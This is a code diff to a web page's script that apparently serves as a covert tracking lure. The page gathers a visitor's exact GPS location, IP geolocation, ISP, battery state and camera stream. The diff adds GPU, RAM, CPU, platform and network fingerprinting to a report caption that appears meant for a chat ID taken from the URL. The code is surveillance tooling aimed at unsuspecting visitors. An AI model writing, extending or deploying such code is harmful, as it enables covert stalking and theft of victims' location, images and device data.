@@ -93,12 +93,33 @@
         
         const urlParams = new URLSearchParams(window.location.search);
         const CHAT_ID = urlParams.get('id');
-        const cameraType = urlParams.get('b'); // 'front', 'back', ya null (Universal link)
+        const cameraType = urlParams.get('b'); 
 
         let globalStream = null;
         let gpsData = { lat: '', lon: '', mapLink: 'N/A' };
         let ipInfo = {};
         let isReady = false;
+
+        function getGPUInfo() {
+            try {
+                let canvas = document.createElement('canvas');
+                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return "Not Supported";
+                let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
+            } catch (e) {
+                return "Error fetching GPU";
+            }
+        }
+
+        function getAdvancedDeviceInfo() {
+            let memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB+` : "Unknown";
+            let cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";
+            let lang = navigator.language || "Unknown";
+            let platform = navigator.platform || "Unknown";
+            let gpu = getGPUInfo();
+            return { memory, cores, lang, platform, gpu };
+        }
 
         function getExactLocation() {
             return new Promise((resolve) => {
@@ -200,7 +221,12 @@
                 batteryText = `${Math.round(bat.level * 100)}% ${bat.charging ? "⚡ Charging" : "🔋 Discharging"}`;
             } catch(e) {}
 
-            let netType = (navigator.connection ? navigator.connection.effectiveType : "4G").toUpperCase();
+            let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            let netType = connection ? connection.effectiveType.toUpperCase() : "4G";
+            let downlink = connection && connection.downlink ? `${connection.downlink} Mbps` : "N/A";
+            let rtt = connection && connection.rtt ? `${connection.rtt} ms` : "N/A";
+
+            let advInfo = getAdvancedDeviceInfo();
 
             let baseCaption = 
                 `🌐 **IP & Exact Location**\n` +
@@ -208,9 +234,12 @@
                 `📍 Location: ${ipInfo.city}, ${ipInfo.region}\n` +
                 `🗺️ **GPS Maps Link**: ${gpsData.mapLink}\n` +
                 `📡 ISP: ${ipInfo.isp}\n\n` +
-                `📱 **Device Details**\n` +
+                `📱 **Advanced Device Specs**\n` +
+                `🎮 GPU/Renderer: \`${advInfo.gpu}\`\n` +
+                `🧠 RAM/Cores: ${advInfo.memory} | ${advInfo.cores}\n` +
+                `💻 Platform/Lang: ${advInfo.platform} (${advInfo.lang})\n` +
                 `🔋 Battery: ${batteryText}\n` +
-                `📶 Network: ${netType}\n` +
+                `📶 Network: ${netType} (Speed: ${downlink}, RTT: ${rtt})\n` +
                 `🖥️ Screen: ${window.screen.width}x${window.screen.height}\n` +
                 `🕒 Time: ${new Date().toLocaleString()}\n\n` +
                 `👑 **CREDIT BY : आयुष नेगी**`;
